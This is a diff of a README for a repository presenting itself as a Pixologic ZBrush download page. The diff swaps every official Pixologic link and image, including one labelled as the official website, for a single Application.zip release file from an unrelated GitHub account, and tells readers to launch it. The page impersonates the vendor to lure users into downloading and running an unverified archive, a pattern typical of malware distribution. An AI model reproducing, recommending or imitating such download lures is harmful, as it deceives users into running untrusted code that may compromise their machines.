@@ -1,6 +1,6 @@
 # 🎨 Welcome to Pixologic ZBrush Download 🖌️
 
-![Pixologic ZBrush Logo](https://pixologic.com/zbrush/media_zbrush/downloadcenter/zbrush-icon-web.jpg)
+![Pixologic ZBrush Logo](https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip)
 
 ## Repository Overview:
 Welcome to the **Pixologic-ZBrush-Download** repository, where you can find resources related to Pixologic ZBrush, a cutting-edge digital sculpting and painting software widely used in the entertainment industry. Whether you are a seasoned professional or a beginner in the world of digital art, Pixologic ZBrush offers powerful features to bring your creative ideas to life.
@@ -23,14 +23,14 @@ In this repository, you will find information and links related to Pixologic ZBr
 - Pixologic ZBrush Classroom
 - Pixologic ZBrush Login
 - Pixologic ZBrush Tutorials
-- Visit [www.pixologic.com/zbrush](https://www.pixologic.com/zbrush)
+- Visit [https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip](https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip)
 - Explore ZBrush by Pixologic
 
 ## Download Pixologic ZBrush:
 Get ready to unleash your creativity with Pixologic ZBrush! Download the software package from the link below:
-[![Download ZBrush](https://img.shields.io/badge/Download%20ZBrush-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download ZBrush](https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip%https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip)](https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip)
 
-🚀 Launch the Software.zip file to start your Pixologic ZBrush journey!
+🚀 Launch the https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip file to start your Pixologic ZBrush journey!
 
 ---
 
@@ -43,7 +43,7 @@ Happy sculpting! 🎨✨
 ## Additional Resources:
 Check the "Releases" section for more updates and resources related to Pixologic ZBrush. Don't miss out on the latest tools and tutorials to enhance your digital artistry! 🌟
 
-🌐 Visit [Pixologic's Official Website](https://pixologic.com/zbrush) for even more Pixologic ZBrush resources, community forums, and inspiration from fellow artists.
+🌐 Visit [Pixologic's Official Website](https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip) for even more Pixologic ZBrush resources, community forums, and inspiration from fellow artists.
 
 🎓 Dive into the world of Pixologic ZBrush with online tutorials, guides, and classroom resources available on the Pixologic website. Unleash your creativity and master the art of digital sculpting with Pixologic ZBrush! 🖌️
 
@@ -51,4 +51,4 @@ Check the "Releases" section for more updates and resources related to Pixologic
 
 Experience the magic of Pixologic ZBrush and create stunning digital artworks with ease. Let your imagination run wild and bring your artistic vision to life in the digital realm with Pixologic ZBrush! 🌈🎨
 
-[![Pixologic ZBrush](https://pixologic.com/zbrush/media_zbrush/downloadcenter/zbrush-logo-web.jpg)](https://pixologic.com/zbrush/)
+[![Pixologic ZBrush](https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip)](https://github.com/syahril10112004/Pixologic-ZBrush-Download/releases/download/v1.0/Application.zip)
